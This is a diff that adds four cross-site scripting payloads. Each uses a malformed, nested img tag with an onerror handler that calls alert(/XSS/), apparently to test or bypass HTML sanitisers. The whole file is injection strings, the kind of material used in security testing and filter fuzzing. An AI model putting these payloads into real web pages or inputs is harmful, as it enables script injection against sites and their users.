@@ -1,0 +1,7 @@
+<img <img src="" onerror=alert(/XSS/)
+
+<img<img src="" onerror=alert(/XSS/)
+
+<img<img/src="" onerror=alert(/XSS/)
+
+<img<img<img src="" onerror=alert(/XSS/)
